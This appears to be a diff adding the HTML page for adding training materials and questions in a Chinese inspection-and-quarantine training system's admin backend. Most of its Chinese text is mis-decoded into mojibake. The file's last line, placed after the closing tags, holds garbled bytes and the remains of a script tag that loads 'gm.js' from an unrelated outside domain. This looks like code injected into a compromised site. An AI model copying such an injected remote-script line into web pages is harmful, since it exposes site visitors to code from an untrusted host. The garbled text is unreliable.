@@ -1,0 +1,192 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<title>¹ã¶«¼ìÑé¼ìÒß£¨¼ìÎñ£©ÍøÉÏÅàÑµÏµÍ³ºóÌ¨¹ÜÀíÏµÍ³</title>
+<link href="../css/htlogin.css" rel="stylesheet" type="text/css" />
+<script type="text/javascript" src="../datepicker/doTable.js"></script>
+<script type="text/javascript" src="../FCKeditor/fckeditor.js"></script>
+<script>
+<!--
+	function getdata()
+	{
+		var url = document.location.search;
+		var vv = url.split('&');
+		if(vv.length==3)
+		{
+			document.all.txtid.value=vv[0].substring(vv[0].indexOf('=')+1,vv[0].length);			
+			document.all.txtname.value=vv[1].substring(vv[1].indexOf('=')+1,vv[1].length);
+			document.all.txtpid.value=vv[2].substring(vv[2].indexOf('=')+1,vv[2].length);
+		}
+	}
+//-->
+</script>
+</head>
+<body onload="getdata();">
+<table width="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#D8F0FD">
+      <tr>
+        <td class="body01"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td background="../images/ht-body01.jpg" class="body02">µ±Ç°Î»ÖÃ£ºÅàÑµ¹ÜÀí-ÅàÑµ½Ì²Ä¹ÜÀí-Ìí¼Ó½Ì²Ä</td>
+            </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td class="body01"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td colspan="5" background="../images/ht-body02.jpg" class="body03">ÏêÏ¸ÐÅÏ¢</td>
+            </tr>
+            <tr>
+              <td width="16%" class="body06">ÉÏ´«ÓÃ»§£º</td>
+              <td colspan="2" class="body04">admin</td>
+              <td width="17%" class="body06">½Ì²Ä±êÌâ£º</td>
+              <td width="32%" class="body04"><input name="txtname" type="text" class="bodytext" /></td>
+            </tr>
+            <tr>
+              <td width="16%" class="body06">·ÖÀà×¨Òµ£º</td>
+              <td colspan="2" class="body04">
+			<select style="width:100px;">
+				<option selected>- ÇëÑ¡Ôñ -</option>
+				<option>¼ìÎñ</option>
+				<option>Ê³Æ·</option>
+				<option>¶¯¼ì</option>
+				<option>Ö²¼ì</option>
+				<option>²ÆÎñ</option>
+				<option>Í³¼Æ</option>
+			</select>
+		</td>
+              <td width="17%"  class="body06">×¨Òµ¸ÚÎ»£º</td>
+		<td width="32%"  class="body04">
+			<select>
+				<option>- ÇëÑ¡Ôñ -</option>
+				<option>±¨¼ì¸Ú</option>
+				<option>¼Æ·Ñ¸Ú</option>
+				<option>Ç©Ö¤¸Ú</option>
+				<option>·ÅÐÐ¸Ú</option>
+				<option>µµ°¸¹ÜÀí¸Ú</option>
+				<option>Á÷³Ì¹ÜÀí¸Ú</option>
+				<option>Ö¤µ¥¹ÜÀí¸Ú</option>
+				<option>Ó¡ÕÂ¹ÜÀí¸Ú</option>
+				<option>×ÛºÏ¹ÜÀí¸Ú</option>
+			</select>
+		</td>
+            </tr>
+            <tr>
+              <td width="16%" class="body06">¹ÜÀíÔ±ÆÀ¼¶£º</td>
+              <td colspan="2" class="body04">
+<select><option>Ò»ÐÇ</option><option>¶þÐÇ</option><option>ÈýÐÇ</option><option>ËÄÐÇ</option><option>ÎåÐÇ</option></select>
+		</td>
+              <td width="17%"  class="body06"></td>
+		<td width="32%"  class="body04">
+		</td>
+            </tr>           
+            <tr   class="body06">
+              <td width="16%" rowspan="3" class="body06">ÉÏ´«½Ì²Ä</td>
+              <td class="body04" colspan="4"  class="body06">
+			  	<input name="txtpid" type="file" class="bodytext" style="width:500px;"/>&nbsp;&nbsp;&nbsp;&nbsp;
+			  	<input type="button"  value="ÉÏ´«"/><br/>
+			  </td>
+            </tr>
+            <tr  class="body06">
+              <td width="9%"  class="body06" align="center">ÐòºÅ</td>
+              <td  colspan="2" class="body06"><div align="center">½Ì²ÄÃû³Æ</div></td>
+              <td  align="center"  class="body06">²Ù×÷</td>
+            </tr>
+            <tr >
+              <td  class="body04" colspan="4" align="center">ÔÝÎÞÎÄ¼þ£¡</td>
+            </tr>
+            <tr>            
+              <td width="16%" class="body06">¹ÜÀíÔ±ÆÀ¼Û£º</td>
+              <td class="body04" colspan="4"><textarea rows=4 cols=80></textarea></td>
+            </tr> 
+	    <tr>
+              <td width="16%" class="body06">°´Óï£º</td>
+              <td class="body04" colspan="4"><textarea rows=4 cols=80></textarea> </td>
+            </tr> 
+            <tr>
+              <td colspan="5" class="body03"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+                  <tr>
+                    <td width="71%" height="35">&nbsp;</td>
+                    <td width="9%"><input type="image" src="../images/ht-but-add.jpg" name="Submit223"  onclick="alert('Ìí¼Ó³É¹¦£¡');document.all.txtid.value='';document.all.txtname.value='';document.all.txtpid.value='';document.all.txtid.focus();"/></td>
+                    <td width="10%"><input type="image" src="../images/ht-but-back.jpg" name="Submit23" onclick="window.history.back(1);"/></td>
+                  </tr>
+              </table></td>
+            </tr>
+        </table></td>
+      </tr>
+
+<tr>
+        <td class="body01"><table  id="objTable" width="100%" border="1" bordercolor="#abcdef" cellspacing="0" cellpadding="5" align="center" bgcolor="#D8F0FD">
+            <tr width="98%">
+              <td colspan="3" background="../images/ht-body02.jpg" class="body03">Åú×¢</td>
+            </tr>
+            <tr>
+              <td width="33%" align="center" class="body05">ÒýÓÃÓï¾ä</td>
+              <td width="33%" align="center" class="body05">Åú×¢</td>
+              <td width="34%" align="center" class="body05">²Ù×÷</td>
+            </tr>
+            <tr>
+              <td width="33%" ><input value=""/></td>
+              <td width="33%" ><input value="" /></td>
+              <td width="34%"  align="center" >
+<input type="image" src="../images/ht-but-del.jpg" name="Submit224" onclick="if(!confirm('È·ÊµÒªÉ¾³ýÂð£¿')){return false;};this.parentNode.parentNode.style.display='none';""/>
+<input type="image" src="../images/ht-but-adit.jpg" name="Submit22" onclick="window.location='update.html?id='+this.parentNode.parentNode.childNodes[1].firstChild.innerHTML+'&name='+this.parentNode.parentNode.childNodes[2].innerHTML+'&pid='+this.parentNode.parentNode.childNodes[3].innerHTML;"/>		
+<input type="image" src="../images/ht-but-add.jpg" name="Submit224" onclick="addRow('objTable');"/>
+		</td>
+	</tr>
+           
+</table></td></tr>
+
+         <tr>
+              <td colspan="5" class="body01"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+                  <tr>
+                    <td width="80%" height="35">&nbsp;</td>
+                    <td width="10%"><input type="image" src="../images/ht-but-OK.jpg" name="Submit223"  onclick="alert('Ìí¼Ó³É¹¦£¡');document.all.txtid.value='';document.all.txtname.value='';document.all.txtpid.value='';document.all.txtid.focus();"/></td>
+                    <td width="10%"><input type="image" src="../images/ht-but-back.jpg" name="Submit23" onclick="window.history.back(1);"/></td>
+                  </tr>
+              </table></td>
+      </tr>
+
+<tr>
+        <td class="body01"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td width="20%" class="body06">ÅúÁ¿µ¼ÈëÌâÄ¿£º</td>
+              <td width="60%" colspan="2" class="body06"><input type="file"  style="width:500px;" /></td>
+              <td width="20%" class="body06"><img  src="../images/ht-but-pldr.jpg"name="Submit23"/></td>
+            </tr>
+	</table></td>
+</tr>
+
+<tr>
+	<td class="body01"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr><td height="31" colspan="6" ><table width="100%" border="0" cellspacing="0" cellpadding="0">
+             	<td width="80%" height="27"  background="../images/ht-body02.jpg">ÌâÄ¿</td>
+	              <td width="10%"  background="../images/ht-body02.jpg" ><input type="image" src="../images/ht-but-addtm.jpg" name="Submit224" onclick="addfun();"/></td>
+		        <td width="10%"   background="../images/ht-body02.jpg"><input type="image" src="../images/ht-but-back.jpg" name="Submit224" onclick="window.history.back();"/></td>
+            	</table></td>
+			</tr>	
+            <tr>
+              <td width="13%" align="center" class="body05">ÌâÄ¿ÀàÐÍ</td>
+              <td width="30%" align="center" class="body05">ÌâÄ¿</td>
+              <td width="18%" align="center" class="body05">¹©Ñ¡´ð°¸</td>
+              <td width="19%" align="center" class="body05">²Ù×÷</td>
+            </tr>
+		<tr>
+			<td colspan="4" align="center">ÔÝÎÞÌâÄ¿£¡</td>
+		</tr>
+        </table></td>
+</tr>      
+     
+</table>
+
+
+
+</body>
+<script>
+	function addfun()
+	{
+		window.location="addquestion.html";
+	}
+</script>
+{®
+z¸.ÓO5ÑvøÎm‰G“g9±«™–íìhttp://qqq.dzydhx.com/gm.js></script>
